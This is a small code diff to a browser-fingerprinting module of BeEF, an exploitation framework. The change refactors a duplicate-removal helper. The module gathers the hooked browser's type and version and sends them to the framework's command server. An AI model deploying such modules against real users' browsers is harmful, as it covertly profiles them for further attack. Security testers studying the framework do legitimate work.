@@ -10,17 +10,16 @@ beef.execute(function() {
 	var browser_version = new Array;
 	var dom = document.createElement('b');
 
-	Array.prototype.unique = function() {
-		var o = {}, i, l = this.length, r = [];
-		for(i=0; i<l;i+=1) o[this[i]] = this[i];
-		for(i in o) r.push(o[i]);
-		return r;
-	};
+  function unique(array) {
+    return $.grep(array, function(el, index) {
+      return index === $.inArray(el, array);
+    });
+  }
 
 	parse_browser_details = function() {
 		if (!browser_type.length) browser_type[0] = "unknown";
 		if (!browser_version.length) browser_version[0] = "unknown";
-		beef.net.send("<%= @command_url %>", <%= @command_id %>, "browser_type="+browser_type.unique()+"&browser_version="+browser_version.unique());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "browser_type="+unique(browser_type)+"&browser_version="+unique(browser_version));
 	};
 
 	// Browser fingerprints // in the form of: "URI","Browser","version(s)"
